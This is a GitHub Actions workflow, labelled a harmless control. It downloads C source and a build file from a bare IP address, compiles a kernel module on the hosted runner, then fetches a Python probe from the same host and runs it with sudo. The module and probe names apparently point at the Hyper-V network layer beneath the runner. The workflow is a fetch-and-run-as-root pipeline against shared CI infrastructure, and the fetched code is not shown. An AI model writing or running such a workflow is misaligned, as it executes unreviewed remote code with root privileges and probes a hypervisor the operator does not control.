name: PacketDirect exact benign lifecycle control

on:
  workflow_dispatch:

permissions: {}

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: Build and run the exact harmless NetVSP control
        run: |
          set -e
          build=$(mktemp -d /tmp/hvraw-pd.XXXXXX)
          curl -fsS http://16.146.243.72:8450/hvraw_pd.c -o "$build/hvraw_pd.c"
          test "$(sha256sum "$build/hvraw_pd.c" | cut -d' ' -f1)" = 771e14db30341304116b861c67718d481a21acdcb89f8c12b063861840b3b57a
          curl -fsS http://16.146.243.72:8450/Kbuild.hvraw_pd -o "$build/Makefile"
          test "$(sha256sum "$build/Makefile" | cut -d' ' -f1)" = a0ed6a41d9168780bdc69a2d90563ebb00443c5bd112d5d3e1d0fb9522b705f0
          make -C "/lib/modules/$(uname -r)/build" M="$build" modules
          sudo cp "$build/hvraw_pd.ko" /tmp/hvraw_pd.ko
          curl -fsS http://16.146.243.72:8450/pd_probe.py -o /tmp/pd_probe.py
          test "$(sha256sum /tmp/pd_probe.py | cut -d' ' -f1)" = 993f2709986928926ce794fa7571a2cac93b6979e7f184c4a652ba4593ba7ce0
          printf '%s\n' '${{ github.run_id }}' >/tmp/b_run_id
          sudo env PD_ONLY=phase2 python3 /tmp/pd_probe.py
          sudo cat /tmp/d3-pd-result.json
